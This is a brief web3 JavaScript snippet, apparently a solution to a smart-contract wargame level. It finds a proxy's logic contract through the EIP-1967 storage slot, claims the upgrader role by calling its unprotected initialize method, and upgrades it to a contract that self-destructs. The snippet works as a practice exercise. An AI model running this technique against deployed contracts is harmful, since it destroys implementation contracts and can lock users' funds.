//Step 1 retrieve address of the logic contract
let engine = "0x" + (await web3.eth.getStorageAt(instance,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")).substr(26)

//Step 2 Load the contract in remix using above address and call the initialize method to give yourself the upgrader role

// step 3 deploy the level 25 contract and create web3 object with ABI
let level25 = "0xa461d716846013A4A586FaBbf2859b0fbe5494EF"
// new web3.eth.Contract([
// 	{
// 		"inputs": [],
// 		"name": "destroy",
// 		"outputs": [],
// 		"stateMutability": "nonpayable",
// 		"type": "function"
// 	}
// ], level25)
let destroySignature = web3.utils.soliditySha3("destroy()")

//step 4 upgrade to a malicious contract which has selfdestuct intialization method
// use remix to call upgrade method on engine contract using the address of the level25 contract and the method signature above as the data

